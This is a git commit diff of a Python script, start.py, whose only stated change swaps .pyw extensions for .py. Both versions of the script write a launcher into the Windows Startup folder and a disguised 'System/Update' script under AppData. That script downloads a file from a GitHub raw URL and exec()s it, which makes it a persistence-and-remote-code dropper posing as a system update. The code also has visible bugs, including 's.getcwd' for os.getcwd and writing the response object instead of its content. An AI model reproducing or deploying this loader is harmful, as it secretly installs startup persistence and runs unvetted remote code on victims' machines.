c9e0451224c83e9fe35310d57ee4bc82c00d68cd
hless191 <61937156+hless191@users.noreply.github.com>
2020-03-08 16:50:36 +0200

    Updated extensions in code

--- start.py
+++ start.py
@@ -1,7 +1,7 @@
 import os
 os.chdir("C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/".format(s.getcwd().split("\\")[2]))
-shortcut = open("sysrun.pyw", "w")
-shortcut.write("exec('C:/Users/{}/AppData/Roaming/Microsoft/Windows/System/Update/update.pyw'.format(s.getcwd().split('\\\\'[2]))")
+shortcut = open("sysrun.py", "w")
+shortcut.write("exec('C:/Users/{}/AppData/Roaming/Microsoft/Windows/System/Update/update.py'.format(s.getcwd().split('\\\\'[2]))")
 if not os.path.exists('../../../System'):
     os.mkdir("../../../System")
 os.chdir("../../../System")
@@ -9,15 +9,15 @@ if not os.path.exists('./Update'):
     os.mkdir("./Update")
 os.chdir("./Update")
 shortcut.close()
-fl = open("update.pyw", "w")
+fl = open("update.py", "w")
 fl.write("""
 import urllib.request
-f = urllib.request.urlopen('https://raw.githubusercontent.com/hless191/update/master/real.pyw')
+f = urllib.request.urlopen('https://raw.githubusercontent.com/hless191/update/master/real.py')
 cont = ""
 for i in f:
     cont += i.decode()
-fl = open("real.pyw", "w")
+fl = open("real.py", "w")
 fl.write(f)
 fl.close()
-exec(open("real.pyw", "r").read())
+exec(open("real.py", "r").read())
 """)
